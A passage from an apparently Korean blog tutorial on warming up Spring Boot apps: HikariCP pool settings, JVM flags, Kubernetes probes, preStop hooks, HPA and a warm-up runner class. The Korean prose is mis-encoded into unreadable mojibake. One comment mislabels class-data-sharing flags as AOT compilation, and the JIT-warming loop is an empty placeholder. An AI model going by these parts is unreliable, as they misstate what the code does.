„-ì´ˆê¸°í™”" class="headerlink" title="4. HikariCP ì»¤ë„¥ì…˜ í’€ ì‚¬ì „ ì´ˆê¸°í™”"></a>4. HikariCP ì»¤ë„¥ì…˜ í’€ ì‚¬ì „ ì´ˆê¸°í™”</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">hikari:</span></span><br><span class="line">      <span class="attr">minimum-idle:</span> <span class="number">10</span></span><br><span class="line">      <span class="attr">maximum-pool-size:</span> <span class="number">20</span></span><br><span class="line">      <span class="comment"># ì»¤ë„¥ì…˜ í’€ì„ ë¯¸ë¦¬ ì±„ì›€</span></span><br><span class="line">      <span class="attr">initialization-fail-timeout:</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DataSourceConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> HikariDataSource <span class="title function_">dataSource</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">HikariConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HikariConfig</span>();</span><br><span class="line">        config.setJdbcUrl(<span class="string">&quot;jdbc:mysql://localhost:3306/mydb&quot;</span>);</span><br><span class="line">        config.setUsername(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        config.setPassword(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">        config.setMinimumIdle(<span class="number">10</span>);</span><br><span class="line">        config.setMaximumPoolSize(<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HikariDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HikariDataSource</span>(config);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ì• í”Œë¦¬ì¼€ì´ì…˜ ì‹œì‘ ì‹œ ì»¤ë„¥ì…˜ í’€ ì›œì—…</span></span><br><span class="line">        warmUpConnectionPool(dataSource);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dataSource;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">warmUpConnectionPool</span><span class="params">(HikariDataSource dataSource)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> dataSource.getConnection()) &#123;</span><br><span class="line">            <span class="comment">// ê°„ë‹¨í•œ ì¿¼ë¦¬ë¡œ ì»¤ë„¥ì…˜ ê²€ì¦</span></span><br><span class="line">            conn.isValid(<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            log.error(<span class="string">&quot;Connection pool warm up failed&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-JVM-Warm-Up-ì˜µì…˜"><a href="#5-JVM-Warm-Up-ì˜µì…˜" class="headerlink" title="5. JVM Warm Up ì˜µì…˜"></a>5. JVM Warm Up ì˜µì…˜</h3><p>JVM ì˜µì…˜ì„ í†µí•´ ì‹œì‘ ì‹œ ìµœì í™”ë¥¼ ê°•í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Tiered Compilation í™œì„±í™” (ê¸°ë³¸ê°’)</span></span><br><span class="line">java -XX:+TieredCompilation -jar application.jar</span><br><span class="line"></span><br><span class="line"><span class="comment"># C2 ì»´íŒŒì¼ëŸ¬ ì„ê³„ê°’ ë‚®ì¶¤ (ë” ë¹ ë¥¸ ìµœì í™”)</span></span><br><span class="line">java -XX:CompileThreshold=1000 -jar application.jar</span><br><span class="line"></span><br><span class="line"><span class="comment"># AOT(Ahead-of-Time) ì»´íŒŒì¼ ì‚¬ìš© (Java 17+)</span></span><br><span class="line">java -XX:ArchiveClassesAtExit=app.jsa -jar application.jar</span><br><span class="line">java -XX:SharedArchiveFile=app.jsa -jar application.jar</span><br></pre></td></tr></table></figure><h2 id="Kubernetesì—ì„œ-Warm-Up-ë°©ë²•"><a href="#Kubernetesì—ì„œ-Warm-Up-ë°©ë²•" class="headerlink" title="Kubernetesì—ì„œ Warm Up ë°©ë²•"></a>Kubernetesì—ì„œ Warm Up ë°©ë²•</h2><p>Kubernetes í™˜ê²½ì—ì„œëŠ” Podê°€ ì¤€ë¹„ë˜ê¸° ì „ì— íŠ¸ë˜í”½ì„ ë°›ì§€ ì•Šë„ë¡ í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤.</p><h3 id="1-Startup-Probe-ì‚¬ìš©"><a href="#1-Startup-Probe-ì‚¬ìš©" class="headerlink" title="1. Startup Probe ì‚¬ìš©"></a>1. Startup Probe ì‚¬ìš©</h3><p>ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ì‹œì‘ë˜ì—ˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤. Startup Probeê°€ ì„±ê³µí•  ë•Œê¹Œì§€ Livenessì™€ Readiness ProbeëŠ” ë¹„í™œì„±í™”ë©ë‹ˆë‹¤.</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">spring-boot-app</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">3</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">app</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">spring-boot-app:latest</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">8080</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Startup Probe: ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ì‹œì‘ë˜ì—ˆëŠ”ì§€ í™•ì¸</span></span><br><span class="line">        <span class="attr">startupProbe:</span></span><br><span class="line">          <span class="attr">httpGet:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/actuator/health/liveness</span></span><br><span class="line">            <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line">          <span class="attr">initialDelaySeconds:</span> <span class="number">0</span></span><br><span class="line">          <span class="attr">periodSeconds:</span> <span class="number">5</span></span><br><span class="line">          <span class="attr">failureThreshold:</span> <span class="number">30</span>  <span class="comment"># ìµœëŒ€ 150ì´ˆ (30 * 5) ëŒ€ê¸°</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Readiness Probe: íŠ¸ë˜í”½ì„ ë°›ì„ ì¤€ë¹„ê°€ ë˜ì—ˆëŠ”ì§€ í™•ì¸</span></span><br><span class="line">        <span class="attr">readinessProbe:</span></span><br><span class="line">          <span class="attr">httpGet:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/actuator/health/readiness</span></span><br><span class="line">            <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line">          <span class="attr">initialDelaySeconds:</span> <span class="number">0</span></span><br><span class="line">          <span class="attr">periodSeconds:</span> <span class="number">5</span></span><br><span class="line">          <span class="attr">failureThreshold:</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Liveness Probe: ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ì‚´ì•„ìˆëŠ”ì§€ í™•ì¸</span></span><br><span class="line">        <span class="attr">livenessProbe:</span></span><br><span class="line">          <span class="attr">httpGet:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/actuator/health/liveness</span></span><br><span class="line">            <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line">          <span class="attr">initialDelaySeconds:</span> <span class="number">30</span></span><br><span class="line">          <span class="attr">periodSeconds:</span> <span class="number">10</span></span><br><span class="line">          <span class="attr">failureThreshold:</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="2-Readiness-Probeì™€-Custom-Health-Indicator"><a href="#2-Readiness-Probeì™€-Custom-Health-Indicator" class="headerlink" title="2. Readiness Probeì™€ Custom Health Indicator"></a>2. Readiness Probeì™€ Custom Health Indicator</h3><p>Spring Boot Actuatorë¥¼ ì‚¬ìš©í•˜ì—¬ ì»¤ìŠ¤í…€ í—¬ìŠ¤ ì²´í¬ë¥¼ êµ¬í˜„í•©ë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WarmUpHealthIndicator</span> <span class="keyword">implements</span> <span class="title class_">HealthIndicator</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="type">boolean</span> <span class="variable">warmedUp</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Health <span class="title function_">health</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (warmedUp) &#123;</span><br><span class="line">            <span class="keyword">return</span> Health.up()</span><br><span class="line">                .withDetail(<span class="string">&quot;status&quot;</span>, <span class="string">&quot;warmed up&quot;</span>)</span><br><span class="line">                .build();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> Health.down()</span><br><span class="line">                .withDetail(<span class="string">&quot;status&quot;</span>, <span class="string">&quot;warming up&quot;</span>)</span><br><span class="line">                .build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">markAsWarmedUp</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.warmedUp = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WarmUpRunner</span> <span class="keyword">implements</span> <span class="title class_">ApplicationRunner</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> WarmUpHealthIndicator warmUpHealthIndicator;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> UserService userService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WarmUpRunner</span><span class="params">(WarmUpHealthIndicator warmUpHealthIndicator,</span></span><br><span class="line"><span class="params">                        UserService userService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.warmUpHealthIndicator = warmUpHealthIndicator;</span><br><span class="line">        <span class="built_in">this</span>.userService = userService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">(ApplicationArguments args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// Warm up ë¡œì§ ì‹¤í–‰</span></span><br><span class="line">        performWarmUp();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Warm up ì™„ë£Œ í‘œì‹œ</span></span><br><span class="line">        warmUpHealthIndicator.markAsWarmedUp();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">performWarmUp</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// ì£¼ìš” ì„œë¹„ìŠ¤ í˜¸ì¶œ</span></span><br><span class="line">        userService.warmUp();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ìºì‹œ í”„ë¦¬ë¡œë”©</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># application.yml</span></span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoint:</span></span><br><span class="line">    <span class="attr">health:</span></span><br><span class="line">      <span class="attr">probes:</span></span><br><span class="line">        <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">group:</span></span><br><span class="line">        <span class="attr">readiness:</span></span><br><span class="line">          <span class="attr">include:</span> <span class="string">warmUp,</span> <span class="string">db,</span> <span class="string">redis</span></span><br></pre></td></tr></table></figure><h3 id="3-PreStop-Hookìœ¼ë¡œ-Graceful-Shutdown"><a href="#3-PreStop-Hookìœ¼ë¡œ-Graceful-Shutdown" class="headerlink" title="3. PreStop Hookìœ¼ë¡œ Graceful Shutdown"></a>3. PreStop Hookìœ¼ë¡œ Graceful Shutdown</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">spring-boot-app</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">app</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">spring-boot-app:latest</span></span><br><span class="line">        <span class="attr">lifecycle:</span></span><br><span class="line">          <span class="comment"># ì¢…ë£Œ ì „ ì²˜ë¦¬</span></span><br><span class="line">          <span class="attr">preStop:</span></span><br><span class="line">            <span class="attr">exec:</span></span><br><span class="line">              <span class="attr">command:</span> [<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;sleep 10&quot;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ì¢…ë£Œ ìœ ì˜ˆ ì‹œê°„</span></span><br><span class="line">      <span class="attr">terminationGracePeriodSeconds:</span> <span class="number">30</span></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># application.yml</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">lifecycle:</span></span><br><span class="line">    <span class="attr">timeout-per-shutdown-phase:</span> <span class="string">20s</span></span><br><span class="line"></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">shutdown:</span> <span class="string">graceful</span></span><br></pre></td></tr></table></figure><h3 id="4-Init-Containerë¡œ-Warm-Up"><a href="#4-Init-Containerë¡œ-Warm-Up" class="headerlink" title="4. Init Containerë¡œ Warm Up"></a>4. Init Containerë¡œ Warm Up</h3><p>ë³„ë„ì˜ Init Containerì—ì„œ warm up ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">spring-boot-app</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="comment"># Init Container: ë©”ì¸ ì»¨í…Œì´ë„ˆ ì‹¤í–‰ ì „ warm up</span></span><br><span class="line">      <span class="attr">initContainers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">warm-up</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">spring-boot-app:latest</span></span><br><span class="line">        <span class="attr">command:</span> [<span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;java -cp /app/lib/*:/app/classes com.example.WarmUpTool&#x27;</span>]</span><br><span class="line"></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">app</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">spring-boot-app:latest</span></span><br></pre></td></tr></table></figure><h3 id="5-HPA-Horizontal-Pod-Autoscaler-ì™€-í•¨ê»˜-ì‚¬ìš©"><a href="#5-HPA-Horizontal-Pod-Autoscaler-ì™€-í•¨ê»˜-ì‚¬ìš©" class="headerlink" title="5. HPA(Horizontal Pod Autoscaler)ì™€ í•¨ê»˜ ì‚¬ìš©"></a>5. HPA(Horizontal Pod Autoscaler)ì™€ í•¨ê»˜ ì‚¬ìš©</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">autoscaling/v2</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">HorizontalPodAutoscaler</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">spring-boot-app-hpa</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">scaleTargetRef:</span></span><br><span class="line">    <span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line">    <span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">spring-boot-app</span></span><br><span class="line">  <span class="attr">minReplicas:</span> <span class="number">3</span></span><br><span class="line">  <span class="attr">maxReplicas:</span> <span class="number">10</span></span><br><span class="line">  <span class="attr">metrics:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">Resource</span></span><br><span class="line">    <span class="attr">resource:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">cpu</span></span><br><span class="line">      <span class="attr">target:</span></span><br><span class="line">        <span class="attr">type:</span> <span class="string">Utilization</span></span><br><span class="line">        <span class="attr">averageUtilization:</span> <span class="number">70</span></span><br><span class="line">  <span class="attr">behavior:</span></span><br><span class="line">    <span class="attr">scaleDown:</span></span><br><span class="line">      <span class="attr">stabilizationWindowSeconds:</span> <span class="number">300</span>  <span class="comment"># 5ë¶„ê°„ ì•ˆì •í™”</span></span><br><span class="line">      <span class="attr">policies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">Percent</span></span><br><span class="line">        <span class="attr">value:</span> <span class="number">50</span></span><br><span class="line">        <span class="attr">periodSeconds:</span> <span class="number">60</span></span><br><span class="line">    <span class="attr">scaleUp:</span></span><br><span class="line">      <span class="attr">stabilizationWindowSeconds:</span> <span class="number">0</span></span><br><span class="line">      <span class="attr">policies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">Percent</span></span><br><span class="line">        <span class="attr">value:</span> <span class="number">100</span></span><br><span class="line">        <span class="attr">periodSeconds:</span> <span class="number">30</span></span><br></pre></td></tr></table></figure><h3 id="6-Pod-Disruption-Budget-ì„¤ì •"><a href="#6-Pod-Disruption-Budget-ì„¤ì •" class="headerlink" title="6. Pod Disruption Budget ì„¤ì •"></a>6. Pod Disruption Budget ì„¤ì •</h3><p>Rolling Update ì¤‘ì—ë„ ìµœì†Œí•œì˜ Podë¥¼ ìœ ì§€í•©ë‹ˆë‹¤.</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">policy/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">PodDisruptionBudget</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">spring-boot-app-pdb</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">minAvailable:</span> <span class="number">2</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">spring-boot-app</span></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">spring-boot-app</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">3</span></span><br><span class="line">  <span class="attr">strategy:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">RollingUpdate</span></span><br><span class="line">    <span class="attr">rollingUpdate:</span></span><br><span class="line">      <span class="attr">maxSurge:</span> <span class="number">1</span>        <span class="comment"># ìµœëŒ€ 1ê°œ ì¶”ê°€ Pod</span></span><br><span class="line">      <span class="attr">maxUnavailable:</span> <span class="number">1</span>  <span class="comment"># ìµœëŒ€ 1ê°œ ì¤‘ë‹¨ ê°€ëŠ¥</span></span><br></pre></td></tr></table></figure><h2 id="ì‹¤ì „-Warm-Up-ì „ëµ"><a href="#ì‹¤ì „-Warm-Up-ì „ëµ" class="headerlink" title="ì‹¤ì „ Warm Up ì „ëµ"></a>ì‹¤ì „ Warm Up ì „ëµ</h2><h3 id="ì¢…í•©-ì˜ˆì‹œ"><a href="#ì¢…í•©-ì˜ˆì‹œ" class="headerlink" title="ì¢…í•© ì˜ˆì‹œ"></a>ì¢…í•© ì˜ˆì‹œ</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Order(1)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ComprehensiveWarmUpRunner</span> <span class="keyword">implements</span> <span class="title class_">ApplicationRunner</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> DataSource dataSource;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> CacheManager cacheManager;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> RestTemplate restTemplate;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;WarmUpTask&gt; warmUpTasks;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">(ApplicationArguments args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        log.info(<span class="string">&quot;Starting comprehensive warm-up process...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="variable">startTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. ë°ì´í„°ë² ì´ìŠ¤ ì»¤ë„¥ì…˜ í’€ warm up</span></span><br><span class="line">        warmUpConnectionPool();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. ìºì‹œ í”„ë¦¬ë¡œë”©</span></span><br><span class="line">        warmUpCache();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. HTTP í´ë¼ì´ì–¸íŠ¸ warm up</span></span><br><span class="line">        warmUpHttpClient();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. ì»¤ìŠ¤í…€ warm up íƒœìŠ¤í¬ ì‹¤í–‰</span></span><br><span class="line">        executeCustomWarmUpTasks();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. JIT ì»´íŒŒì¼ íŠ¸ë¦¬ê±°</span></span><br><span class="line">        triggerJitCompilation();</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="variable">duration</span> <span class="operator">=</span> System.currentTimeMillis() - startTime;</span><br><span class="line">        log.info(<span class="string">&quot;Warm-up process completed in &#123;&#125; ms&quot;</span>, duration);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">warmUpConnectionPool</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> dataSource.getConnection()) &#123;</span><br><span class="line">            conn.isValid(<span class="number">1</span>);</span><br><span class="line">            log.info(<span class="string">&quot;Database connection pool warmed up&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            log.error(<span class="string">&quot;Failed to warm up connection pool&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">warmUpCache</span><span class="params">()</span> &#123;</span><br><span class="line">        warmUpTasks.stream()</span><br><span class="line">            .filter(task -&gt; task.getType() == WarmUpTaskType.CACHE)</span><br><span class="line">            .forEach(WarmUpTask::execute);</span><br><span class="line">        log.info(<span class="string">&quot;Cache warmed up&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">warmUpHttpClient</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            restTemplate.getForObject(<span class="string">&quot;http://localhost:8080/actuator/health&quot;</span>, String.class);</span><br><span class="line">            log.info(<span class="string">&quot;HTTP client warmed up&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            log.warn(<span class="string">&quot;Failed to warm up HTTP client&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">executeCustomWarmUpTasks</span><span class="params">()</span> &#123;</span><br><span class="line">        warmUpTasks.forEach(task -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                task.execute();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                log.error(<span class="string">&quot;Warm up task failed: &#123;&#125;&quot;</span>, task.getName(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">triggerJitCompilation</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// ì£¼ìš” ë¹„ì¦ˆë‹ˆìŠ¤ ë¡œì§ì„ ì—¬ëŸ¬ ë²ˆ ì‹¤í–‰í•˜ì—¬ JIT ìµœì í™” ìœ ë„</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">            <span class="comment">// í•« ë©”ì†Œë“œ í˜¸ì¶œ</span></span><br><span class="line">        &#125;</span><br><span class="line">        log.info(<span class="string">&quot;JIT compilation triggered&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">WarmUpTask</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">()</span>;</span><br><span class="line">    String <span class="title function_">getName</span><span class="params">()</span>;</span><br><span class="line">    WarmUpTaskType <span class="title function_">getType</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">WarmUpTaskType</span> &#123;</span><br><span class="line">    CACHE, SERVICE, CLIENT</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ëª¨ë‹ˆí„°ë§-ë°-ì¸¡ì •"><a href="#ëª¨ë‹ˆí„°ë§-ë°-ì¸¡ì •" class="headerlink" title="ëª¨ë‹ˆí„°ë§ ë° ì¸¡ì •"></a>ëª¨ë‹ˆí„°ë§ ë° ì¸¡ì •</h2><p>Warm up íš¨ê³¼ë¥¼ ì¸¡ì •í•˜ê¸° ìœ„í•´ ë©”íŠ¸ë¦­ì„ ìˆ˜ì§‘í•©ë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WarmUpMetrics</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MeterRegistry meterRegistry;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WarmUpMetrics</span><span class="params">(MeterRegistry meterRegistry)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.meterRegistry = meterRegistry;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">recordWarmUpDuration</span><span class="params">(String taskName, <span class="type">long</span> durationMs)</span> &#123;</span><br><span class="line">        Timer.builder(<span class="string">&quot;warmup.duration&quot;</span>)</span><br><span class="line">            .tag(<span class="string">&quot;task&quot;</span>, taskName)</span><br><span class="line">            .register(meterRegistry)</span><br><span class="line">            .record(durationMs, TimeUnit.MILLISECONDS);</span><br><span class="line">    &#125;</span><br><span 